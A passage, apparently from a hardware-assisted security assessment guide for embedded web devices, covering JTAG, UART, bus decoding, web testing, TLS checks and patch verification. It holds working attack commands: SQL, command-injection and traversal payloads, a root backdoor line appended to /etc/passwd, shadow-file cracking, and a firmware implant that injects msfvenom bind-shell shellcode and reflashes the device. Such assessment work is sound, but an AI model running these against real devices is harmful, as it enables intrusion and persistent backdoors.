Establish a JTAG connection for runtime inspection. Launch OpenOCD with appropriate configuration files for your adapter and target: `openocd -f interface/ftdi/olimex-arm-usb-tiny-h.cfg -f target/stm32f4x.cfg`. If OpenOCD fails to detect the target, verify the JTAG pinout with a logic analyzer by probing TCK for clock activity during boot. Once connected, halt the processor: `telnet localhost 4444`, then `reset halt`. Verify register access with `reg` to display all CPU registers. Dump memory regions of interest: `dump_image ram_dump.bin 0x20000000 0x20000` for SRAM, `dump_image flash_dump.bin 0x08000000 0x100000` for internal flash. Set breakpoints on security-critical functions identified during static analysis: `bp 0x080012A0 4 hw` for a hardware breakpoint at address 0x080012A0. Attach GDB for source-level debugging: `gdb-multiarch binary_name`, then `target extended-remote localhost:3333`.

### UART Console Access and Log Monitoring

Establish serial console access for boot log capture and runtime debugging. Connect the USB-UART bridge to the identified TX/RX pins, set the baud rate to the detected value (typically 115200), and open a terminal: `minicom -D /dev/ttyUSB0 -b 115200`. Alternatively, use `screen /dev/ttyUSB0 115200`. Power on the device and capture the complete boot sequence. Look for critical information: bootloader version, kernel command line arguments, filesystem mount options, service startup messages, and any debug output left enabled by developers. Search for credentials in logs: `grep -i -E '(password|token|secret|key)' boot_log.txt`. If a root shell prompt appears on the UART console without authentication, document this as a critical vulnerability.

### Logic Analyzer Protocol Decoding Commands

Capture and decode bus traffic systematically. For SPI flash boot sequence: `sigrok-cli -d fx2lafw --config samplerate=100000000 --channels 0=CLK,1=MOSI,2=MISO,3=CS --triggers CS=f --samples 67108864 -o boot.sr`. Decode: `sigrok-cli -i boot.sr -P spi:clk=CLK:mosi=MOSI:miso=MISO:cs=CS -A spi=mosi-data,spi=miso-data > spi_decoded.txt`. For UART traffic: `sigrok-cli -d fx2lafw --config samplerate=10000000 --channels 0=TX,1=RX -P uart:baudrate=115200:parity=none:data_bits=8:stop_bits=1 -A uart=tx-data,uart=rx-data > uart_decoded.txt`. For I²C EEPROM access: `sigrok-cli -d fx2lafw --config samplerate=10000000 --channels 0=SDA,1=SCL -P i2c:scl=SCL:sda=SDA -A i2c=address-read,i2c=address-write,i2c=data-read,i2c=data-write > i2c_decoded.txt`. Analyze decoded output for plaintext credentials, cryptographic keys, or sensitive session state.

### Web Application Attack Surface Mapping

Enumerate HTTP endpoints and identify attack vectors. Use `curl` to retrieve the index page and extract links: `curl -k https://TARGET_IP/ | grep -oP 'href="\K[^"]+' | sort -u > endpoints.txt`. Test for directory traversal: `curl -k https://TARGET_IP/../../../etc/passwd`. Attempt SQL injection in login forms: `curl -k https://TARGET_IP/login -d "username=admin' OR '1'='1' --&password=x"`. Test command injection in diagnostic tools: `curl -k https://TARGET_IP/ping -d "target=8.8.8.8; id"`. Check for default credentials by testing common username/password combinations: admin/admin, root/root, admin/password. Capture cookies and session tokens with `-c` flag: `curl -k -c cookies.txt https://TARGET_IP/login -d "username=admin&password=admin"`, then test session fixation or prediction by replaying modified cookies: `curl -k -b "session=modified_token" https://TARGET_IP/admin`.

### Cryptographic Implementation Verification

Inspect TLS configuration and certificate validation. Use `openssl s_client -connect TARGET_IP:443 -showcerts` to retrieve the certificate chain and identify self-signed certificates or expired validity periods. Test for weak cipher suites: `nmap --script ssl-enum-ciphers -p 443 TARGET_IP` reveals enabled ciphers and protocol versions. If SSLv3, TLS 1.0, or weak ciphers like RC4 are enabled, document these as vulnerabilities. Examine the certificate's CN (Common Name) and SAN (Subject Alternative Name) fields for wildcard usage or mismatched domains. Extract the certificate from the firmware filesystem and verify its storage: if the private key is stored alongside the certificate without encryption, it is extractable by any attacker with filesystem access. Test certificate validation by presenting a self-signed certificate with a matching CN: if the device accepts it, certificate pinning is absent.

### Timing Attack Measurement Procedure

Conduct high-precision timing measurements to detect side-channel leakage. Set up a Python script with `time.perf_counter()` to measure authentication request latency. For hardware-level timing, configure the logic analyzer to capture a GPIO pin that toggles during authentication processing: `sigrok-cli -d fx2lafw --config samplerate=100000000 --channels 0=AUTH_GPIO --continuous -o timing.sr`. Send a series of authentication attempts with known incorrect passwords and measure the response time for each character position. Plot the results to identify timing variance correlated with correct character guesses. A measurable difference of more than 1 microsecond per character indicates exploitable timing side channels. Validate findings by successfully extracting a known test password using the timing oracle, then attempt the attack against administrative accounts.

### Privilege Escalation Verification Techniques

After achieving initial access via SQL injection or command injection, escalate privileges and validate through hardware evidence. Use JTAG to dump the process memory space and verify that the web server runs as root: inspect the UID field in the process's task_struct. If the server runs as root, any command injection vulnerability grants full system compromise. Execute `cat /proc/self/status` through the injection point and examine the Uid and Gid fields in the command output. If you achieve command execution as a non-privileged user, search for SUID binaries: `find / -perm -4000 2>/dev/null`. Exploit SUID binaries to escalate to root, then dump `/etc/shadow` and crack password hashes offline with `john` or `hashcat`. Confirm root access by writing to protected files: `echo "backdoor_user:x:0:0::/root:/bin/sh" >> /etc/passwd` through the injection point, then attempt login as the backdoor user.

### Firmware Modification and Implantation Process

Construct and deploy persistent backdoors through firmware modification. Extract the web server binary from the firmware filesystem, identify a code cave or function hook point via disassembly, and inject shellcode that establishes a bind shell on port 31337. Assemble the shellcode: `msfvenom -p linux/armle/shell_bind_tcp LPORT=31337 -f raw -o shellcode.bin`. Inject the shellcode into the binary at the identified offset using a hex editor or `dd`: `dd if=shellcode.bin of=webserver_binary bs=1 seek=32768 conv=notrunc`. Reconstruct the filesystem: `mksquashfs modified_filesystem modified_firmware.sqfs -comp xz -noappend`. Repackage the complete firmware image by concatenating bootloader, kernel, and modified filesystem, preserving the original offsets. Write the modified firmware to the SPI flash: `flashrom -p ft2232_spi:type=232H -c "CHIP_MODEL" -w modified_firmware.bin`. After flashing, verify the write with a read-back and hash comparison to ensure no corruption occurred. Power on the device, connect via UART to monitor the boot sequence for errors, and test the backdoor by connecting to the bind shell port: `nc TARGET_IP 31337`.

### Incident Response and Forensic Evidence Collection

Document all findings with hardware-verified evidence. For each vulnerability, collect: the exact firmware offset or function address where the vulnerability exists, disassembly snippets showing the vulnerable code pattern, UART logs capturing exploit output, JTAG memory dumps proving privilege state, SPI flash captures showing malicious firmware writes, and GPIO timing diagrams demonstrating side-channel leakage. Store all raw capture files (`.sr` sigrok sessions, `.bin` memory dumps, `.txt` decoded logs) in a forensics archive. Generate SHA-256 hashes for all binary artifacts to ensure chain of custody. Prepare a technical report correlating software vulnerabilities with hardware evidence: for SQL injection, include the disassembly showing string concatenation, the UART log showing the injected query execution, and the JTAG memory dump showing the elevated privilege session state. This multi-layer evidence provides irrefutable proof of exploitability and supports remediation prioritization.

### Remediation Verification Post-Patching

After vendors issue firmware updates addressing identified vulnerabilities, verify the fixes through the same hardware instrumentation. Re-extract the updated firmware, compare binaries with `diff` or `radare2`'s `radiff2` tool to identify changed functions. Disassemble the patched authentication function and confirm that SQL query construction now uses parameterized queries instead of string concatenation. Repeat the SQL injection attack against the updated firmware and verify that the exploit no longer succeeds. Use JTAG to confirm that session state remains unprivileged after injection attempts. Test timing attacks against the patched code to ensure constant-time comparison functions are used. If vulnerabilities persist or new ones are introduced, document regression failures with the same hardware evidence methodology. This iterative verification cycle ensures that security patches genuinely address root causes rather than superficially filtering specific payloads.

This operational checklist and command reference equips you to conduct systematic, hardware-verified security assessments of embedded web systems. By grounding every vulnerability finding in physical measurements—SPI flash contents, JTAG memory state, UART debug output, logic analyzer timing traces—you produce forensic-grade evidence that transcends the ambiguity of software-only security testing, proving exploitability from application layer down to silicon.
